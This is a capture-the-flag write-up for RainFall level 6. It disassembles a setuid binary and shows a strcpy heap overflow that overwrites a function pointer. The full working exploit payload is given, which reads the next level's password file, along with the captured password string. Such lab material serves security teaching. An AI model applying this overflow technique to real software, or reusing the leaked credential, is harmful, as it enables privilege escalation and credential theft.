# Level 6

Once logged in, you will see a binary `level6`.

```
$ ssh level6@localhost -p 4444
	  _____       _       ______    _ _
	 |  __ \     (_)     |  ____|  | | |
	 | |__) |__ _ _ _ __ | |__ __ _| | |
	 |  _  /  _` | | '_ \|  __/ _` | | |
	 | | \ \ (_| | | | | | | | (_| | | |
	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on localhost:4242
level6@localhost's password:
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
level6@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
```

Let's run this and see what this does.

```
level6@RainFall:~$ ./level6
Segmentation fault (core dumped)
level6@RainFall:~$
level6@RainFall:~$ ./level6 adsfasdfa
Nope
```

Now, finally, it does something different from last levels.

Taking a look at the binary, there are three functions we want to look at.

```
gdb-peda$ info functions
[...]
0x08048454  n
0x08048468  m
0x0804847c  main
[...]
gdb-peda$
```

```
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0804847c <+0>:	push   ebp
   0x0804847d <+1>:	mov    ebp,esp
   0x0804847f <+3>:	and    esp,0xfffffff0
   0x08048482 <+6>:	sub    esp,0x20
   0x08048485 <+9>:	mov    DWORD PTR [esp],0x40
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>		; allocates 64 bytes
   0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>		; allocates 4 bytes
   0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax
   0x080484a5 <+41>:	mov    edx,0x8048468				; address of m
   0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>:	mov    DWORD PTR [eax],edx			; eax = edx -> malloc(4) = m;
   0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>:	add    eax,0x4
   0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>:	mov    edx,eax
   0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>		; strcpy of buf (= malloc(64)) to m
   0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:	call   eax							; call buf
   0x080484d2 <+86>:	leave
   0x080484d3 <+87>:	ret
End of assembler dump.
```

```
gdb-peda$ disass m
Dump of assembler code for function m:
   0x08048468 <+0>:	push   ebp
   0x08048469 <+1>:	mov    ebp,esp
   0x0804846b <+3>:	sub    esp,0x18
   0x0804846e <+6>:	mov    DWORD PTR [esp],0x80485d1		; 0x80485d1:	 "Nope"
   0x08048475 <+13>:	call   0x8048360 <puts@plt>			; puts "Nope"
   0x0804847a <+18>:	leave
   0x0804847b <+19>:	ret
End of assembler dump.
```

```
gdb-peda$ disass n
Dump of assembler code for function n:
   0x08048454 <+0>:	push   ebp
   0x08048455 <+1>:	mov    ebp,esp
   0x08048457 <+3>:	sub    esp,0x18
   0x0804845a <+6>:	mov    DWORD PTR [esp],0x80485b0		; 0x80485b0:	 "/bin/cat /home/user/level7/.pass"
   0x08048461 <+13>:	call   0x8048370 <system@plt>		; system(0x80485b0) = system("/bin/cat /home/user/level7/.pass")
   0x08048466 <+18>:	leave
   0x08048467 <+19>:	ret
End of assembler dump.
```

By analyzing the assembly (and decompiled C), we can tell the main function allocates memory on the heap with `malloc`, and calls function `m`. Our goal in this exploit is to call `n` instead.

Remember the function `strcpy` has vulnerability which enables us to change a program's functionality through a buffer overflow.

Here we made the correct assumption that `malloc` stores values mostly next to one another plus some overhead. (We could have checked with GDB, but this worked first.) We found the correct memory location by writing a bit more to the copied argument than there was space available, thus overwriting the function pointer.

```
level6@RainFall:~$ ./level6 $(python -c "print 'B'*64")
Nope
level6@RainFall:~$ ./level6 $(python -c "print 'B'*65")
Nope
level6@RainFall:~$ ./level6 $(python -c "print 'B'*66")
Nope
level6@RainFall:~$ ./level6 $(python -c "print 'B'*67")
Nope
level6@RainFall:~$ ./level6 $(python -c "print 'B'*68")
Nope
level6@RainFall:~$ ./level6 $(python -c "print 'B'*69")
Nope
level6@RainFall:~$ ./level6 $(python -c "print 'B'*70")
Nope
level6@RainFall:~$ ./level6 $(python -c "print 'B'*71")
Nope
level6@RainFall:~$ ./level6 $(python -c "print 'B'*72")
Segmentation fault (core dumped)
```

Now we just add on our desired value to be called, and voilà our completed exploit. (Note that it crashes at `72` bytes because the `'\0'` overwrites part of the string we're interested in, which is why we're not modifying the below exploit to have an offset of `71`.)

```
level6@RainFall:~$ ./level6 $(python -c "print 'B'*72 + '\x54\x84\x04\x08'")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
